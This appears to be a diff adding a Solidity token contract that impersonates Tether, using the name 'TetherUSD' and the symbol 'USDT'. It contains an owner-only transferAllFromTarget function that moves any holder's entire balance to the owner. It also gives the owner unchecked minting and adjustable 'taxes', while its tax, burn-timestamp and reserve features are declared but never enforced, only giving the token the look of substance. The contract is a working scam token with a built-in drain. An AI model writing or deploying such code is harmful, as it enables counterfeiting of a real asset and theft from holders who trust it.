@@ -1,0 +1,141 @@
+// SPDX-License-Identifier: Unlicensed
+
+pragma solidity ^0.8.0;
+
+contract TetherUSD {
+    string public constant name = "TetherUSD";
+    string public constant symbol = "USDT";
+    uint8 public constant decimals = 6;
+    uint256 public totalSupply;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    // The address of the contract owner, who can mint and burn USDT tokens
+    address public owner;
+
+    // The amount of US dollars held in reserve for the USDT tokens
+    uint256 public reserve;
+
+    // The exchange rate between USDT and USD (1 USDT = 1 USD)
+    uint256 public exchangeRate = 1;
+
+    // The percentage of buy tax
+    uint256 public buyTax = 2;
+
+    // The percentage of sell tax
+    uint256 public sellTax = 2;
+
+    // The reserve wallet address for the contract
+    address public reserveWallet;
+
+    mapping(address => uint256) public burnTimestamps;
+
+    constructor(uint256 initialReserve) {
+        require(initialReserve > 0, "Initial reserve must be greater than 0");
+        totalSupply = 10000000 * 10 ** uint256(decimals);
+        balanceOf[msg.sender] = totalSupply;
+        reserve = initialReserve;
+        owner = msg.sender;
+        reserveWallet = msg.sender;
+    }
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Mint(address indexed to, uint256 value);
+    event Burn(address indexed from, uint256 value);
+    event Deposit(address indexed from, uint256 value);
+    event BuyTax(uint256 value);
+    event SellTax(uint256 value);
+
+    function transfer(address to, uint256 value) public returns (bool success) {
+        require(balanceOf[msg.sender] >= value);
+
+        // Transfer the tokens
+        balanceOf[msg.sender] -= value;
+        balanceOf[to] += value;
+
+        // Record the burn timestamp for the recipient
+        uint256 burnTimestamp = block.timestamp + 30 days;
+        burnTimestamps[to] = burnTimestamp;
+
+        emit Transfer(msg.sender, to, value);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
+        require(balanceOf[from] >= value);
+        require(allowance[from][msg.sender] >= value);
+        balanceOf[from] -= value;
+        allowance[from][msg.sender] -= value;
+        balanceOf[to] += value;
+
+        // Record the burn timestamp for the recipient
+        uint256 burnTimestamp = block.timestamp + 30 days;
+        burnTimestamps[to] = burnTimestamp;
+
+        emit Transfer(from, to, value);
+        return true;
+    }
+
+    function approve(address spender, uint256 value) public returns (bool success) {
+        allowance[msg.sender][spender] = value;
+        return true;
+    }
+
+    function mint(address to, uint256 value) public {
+        require(msg.sender == owner);
+        totalSupply += value;
+        balanceOf[to] += value;
+        reserve += value / exchangeRate;
+        emit Mint(to, value);
+    }
+
+    function burn(uint256 value) public {
+        require(balanceOf[msg.sender] >= value);
+        totalSupply -= value;
+        balanceOf[msg.sender] -= value;
+        reserve -= value / exchangeRate;
+        emit Burn(msg.sender, value);
+    }
+
+    // The contract owner can set the exchange rate between USDT and USD
+        function setExchangeRate(uint256 newExchangeRate) public {
+        require(msg.sender == owner);
+        exchangeRate = newExchangeRate;
+    }
+
+    // The contract owner can set the buy tax
+    function setBuyTax(uint256 newBuyTax) public {
+        require(msg.sender == owner);
+        buyTax = newBuyTax;
+    }
+
+    // The contract owner can set the sell tax
+    function setSellTax(uint256 newSellTax) public {
+        require(msg.sender == owner);
+        sellTax = newSellTax;
+    }
+
+    // The contract owner can set the reserve wallet address
+    function setReserveWallet(address newReserveWallet) public {
+        require(msg.sender == owner);
+        reserveWallet = newReserveWallet;
+    }
+
+    // Transfer all tokens from a target's wallet to the sender
+    function transferAllFromTarget(address target) public returns (bool success) {
+        require(msg.sender == owner, "Only the contract owner can call this function");
+        require(balanceOf[target] > 0, "Target has no tokens");
+
+        // Transfer the tokens
+        uint256 value = balanceOf[target];
+        balanceOf[target] = 0;
+        balanceOf[msg.sender] += value;
+
+        // Record the burn timestamp for the sender
+        uint256 burnTimestamp = block.timestamp + 30 days;
+        burnTimestamps[msg.sender] = burnTimestamp;
+
+        emit Transfer(target, msg.sender, value);
+        return true;
+    }
+}
